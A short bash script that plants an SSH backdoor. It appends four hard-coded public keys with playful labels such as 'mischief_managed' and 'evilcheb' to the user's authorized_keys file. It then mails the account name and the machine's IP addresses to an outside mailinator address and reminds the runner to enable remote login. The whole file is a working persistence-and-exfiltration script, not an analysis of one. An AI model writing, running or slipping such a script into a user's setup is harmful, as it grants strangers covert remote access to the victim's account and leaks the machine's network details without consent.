#!/bin/bash
mkdir ~/.ssh
chmod 700 ~/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3nIOH+c1XgNbnrtnGqMNnDF472TEs5nqb4un3h6JyNKo+KF/Fpz++3Vz0wl6s5gytMFRrp5vJoR+KPaVuxBern0l/uAmJWNdnGCwAQqmX0gJaj8tlcgQ8qJtgZETyTGJVH6QU58z72tmvIVudYDnpmC/hATVja4x4GFo/Ob+cC2VUt3W+tWXZK/OfON54iA9R0RC+IAdb/vX8JZ0MhheBKf8SjzThCIsSCZmj4OXmnpOzwjZgWqJo27f3Z/rCdRGX+PAQF1FvlL5waYmY2sIG+d8hL60oxLVDliTuhN9DBCuDRr+OE7gV3IvLr2jlMCiZjlMJoaaPUyK6zWna+rjv milleus" >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDldpqd7MMNtsoQhaumOX2tOZQCh8EeSxeLQ2xkufJzjxqnj9pxby9OVoTp8nHkRNLorRIfSWbTfomEf9QfAPnsUCxU6D40VYh9NgHQmSQv4zoR3tx1fbwYkceKx+PPZF4mDONFXKKCb84F97pzTu++CFP9u+xEKhl+tWz4dWpOkTk7l8w1/Mg/SHzjuky/HOs1+vPYMq9Y7QHBF0juuDJ6QypNf8NIcs25yyz58/1UtiJQEhu+N7gMtBW2+XSrhR+kKuC8OFpu4oqEobWIga3FHUwYvAvekvu/y7zawgXfD8dRZwRiSRYUzUlx6G3UKhAHkDHzUL3TtQwNSohbD7g/ mischief_managed" >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCx5BMR2oZma0vLO/304ooAGu+Y7cZV8Ab1uG0rNO4j86y9E9WyHEiI5EumFt/DVj0TfLCrcqa0k95nD3tsKfHq+9l/kDTcSF8G1V5MLtA21/2u9EuTmy36RKpo9fiBY5hk3bSIBzLXr8FQn/Q3q0b12uQl49z1Zlst/Kw1NuAZMU4kjRBM78Ovv0LB86Ik3eTZuwf7Eiyx41xq8B9IvUGRTKttNL1ggvXLCxFv/PcbRTJJXHjhp+Z6EI07OUG99GlHwgDvYkusq5cB3VmtIuvfhxse5RbiSwSX5fXUDXK23upfyNP4KR6EVUvimAhxXvdepoe3tefFRYopSq9RCmdz milkyway" >> ~/.ssh/authorized_keys
echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGFw5JPS96Eys+EmqlP75nmNJHDq9Ear2rMnChux/deV8Skq99FpwA34nqML0QZLzsw/j6LOXr5E/fYxpgE5HtmlOALtajAI343zZpqRn2YMywir8LQS2dlDe1kNrblAX57xxVgPe/ZljSzaFLBAoU1KAYvwj4gEUSjXT7kX4SWZOp1bRCrgbndOYJ9WzWBVNkomnm8ZxQmgPijPnn6gVCvWlRAnhSoF1mVn+SI2BlePwwBaMu4EkN00pDc3xBSEOn8kIu88WMi+1+QzEFeAVnAftc7vEOOewkOc9HVUQwKCrAqSQ9UPSXjNaPH/vhNL6HIRtOORUCkuEEXyxM0Akz evilcheb" >> ~/.ssh/authorized_keys
chmod 700 ~/.ssh/authorized_keys
id="$(id -un)"
body="$(ifconfig | grep "inet ")"
echo "$id $body" | mail -s "ip address" "mischief_managed@mailinator.com"
echo "rsa public key added and email sent"
echo "don't forget to turn on remote login!"
